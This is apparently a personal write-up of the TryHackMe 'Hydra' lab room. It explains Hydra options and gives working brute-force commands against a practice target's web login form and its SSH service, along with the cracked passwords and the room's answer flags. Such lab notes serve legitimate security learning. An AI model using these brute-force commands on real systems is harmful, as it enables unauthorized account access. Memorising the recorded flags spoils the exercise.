---
{"dg-publish":true,"permalink":"/try-hack-me/rooms/hydra/","created":"2024-11-04T16:15:42.215-05:00","updated":"2025-03-09T16:38:29.672-04:00"}
---

# Task 2 - Using Hydra

| Option              | Description                                                                            |
| ------------------- | -------------------------------------------------------------------------------------- |
| -l                  | specifies the (SSH) username for login                                                 |
| -P                  | indicates a list of passwords                                                          |
| -t                  | sets the number of threads to spawn                                                    |
| http-post-form      | the type of the form is POST                                                           |
| path              | the login page URL, for example, login.php                                             |
| login_credentials | the username and password used to log in, for example, username=^USER^&password=^PASS^ |
| invalid_response  | part of the response when the login fails                                              |
| -V                  | verbose output for every attempt                                                       |

- Example command to brute force ftp    
    - `hydra -l user -P passlist.txt [ftp://MACHINE_IP](ftp://MACHINE_IP)`
- Another example
    - `hydra -l <username> -P <wordlist> 10.10.71.57 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

> [!Question]
> **Use Hydra to bruteforce molly's web password. What is flag 1?**

Going to the target IP address gives us a web login from with a username and password,

 ![Exported image](/img/user/TryHackMe/THM_Images/6acea8dcaa459a0a51bc6bac7a46278c.png)  

Checking the page source tells us that its using a "POST" method as the request type

 ![Exported image](/img/user/TryHackMe/THM_Images/4caa7657ba57ccde9af7565786a80179.png)

Ran the command

```
hydra -l molly -P rockyou.txt 10.10.71.57 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect"
```
   
![Exported image](/img/user/TryHackMe/THM_Images/d3bfcde61619b5012049d3a2a6e334f6.png)  

Using the username, molly, and the password, sunshine, allows us to make it through and login to find the flag.

![Exported image](/img/user/TryHackMe/THM_Images/8b26c6071413b8325dd2a902f06fd47d.png)  

> [!Success] Answer
> THM{2673a7dd116de68e85c48ec0b1f2612e}

> [!Question]
> **Use Hydra to bruteforce molly's SSH password. What is flag 2?** 

Used the following command to find the SSH password: 

```
hydra -l molly -P rockyou.txt 10.10.71.57 -t 4 ssh
```

![Exported image](/img/user/TryHackMe/THM_Images/b63f779eaf9859ed2e22f534b6bea215.png)  

Then SSH'd into molly's machine to get the flag using the password, butterfly.

![Exported image](/img/user/TryHackMe/THM_Images/12d9adee146e29ab4487aaf9bc440b49.png)  

> [!Success] Answer
> THM{c8eeb0468febbadea859baeb33b2541b}
